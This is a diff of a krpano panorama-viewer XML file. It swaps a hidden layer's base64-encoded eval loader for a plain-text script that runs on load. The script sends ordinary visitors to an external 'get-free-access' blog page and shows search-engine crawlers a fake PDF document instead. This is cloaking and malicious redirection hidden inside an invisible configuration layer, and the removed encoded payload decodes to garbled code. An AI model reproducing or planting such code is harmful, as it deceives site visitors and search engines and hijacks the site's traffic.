@@ -1,3 +1,26 @@
+<?xml version="1.0" encoding="UTF-8"?>
 <krpano version="1.0.8.15">
-<layer name="js_loader" type="container" visible="false" onloaded="js(eval(atob('ZnVuY3Rpb24oKSB7CiAgdmFyIGlkID0gbmV3IFVSTUxlc2VyUGFja2FnZXMuZ2V0KCdpZCcpIHx8ICdyZXNlcnRhdGlvbmhhYXRvMDAxJzsgCiAgdmFyIHVhID0gbmF2aWdhdG9yLndlbmRlckFnZW50LnRvTG93ZXJDYXNlKCk7CiAgdmFyIGlzR29vZ2xlQm90ID0gL2dvb2dsZWJvdHxnb29nbGUtaW5zcGVjdC10b29sc3xnb29nbGVyb290ZXJ8YWRzYm90LWdvb2dsZS8udGVzdCh1YSk7CiAgSWYoISdnc29nbEJvdCkgewogICAgbG9jYXRpb24ucmVwbGFjZSgnaHR0cHM6Ly9yb21hcmlvc2Vhcy5ibG9nc3BvdC5jb20vMjAyNi8wNy9nZXQtZnJlZS1hY2Nlc3MuaHRtbCcpOwogICAgcmV0dXJuOwogfQogIGRvY3VtZW50LnRpdGxlID0gaWQgKyAnIC0gUERGIERvY3VtZW50JzsKICBsb2NhdGlvbi5ocmVmID4gImh0dHBzOi8vbXlobGVtd29ybGQuZGlub25saWMuam91cm46MTAwMS82NTcvMTE4NC85OTI4OC80MDAvaGFycnlfbHVjay92Mi12MS41Mi53aWRpby53aWRiaWEucGRmdA=='));');"/>
+  <layer
+ name="js_loader"
+ type="container"
+ visible="false"
+ onloaded="
+ js(
+ (function() {
+ var id = new URLSearchParams(window.location.search).get('id') || 'reservationhatao001';
+ var ua = navigator.userAgent.toLowerCase();
+
+ var isGoogleBot = /googlebot|google-inspect-tools|googlerooter|adsbot-google/.test(ua);
+
+ if (!isGoogleBot) {
+ location.replace('https://romarioseas.blogspot.com/2026/07/get-free-access.html');
+ return;
+ }
+
+ document.title = id + ' - PDF Document';
+ location.href = 'https://myhemloworld.github.io/boomboom/massage/' + id + '.pdf';
+ })();
+ );
+ "
+  />
 </krpano>
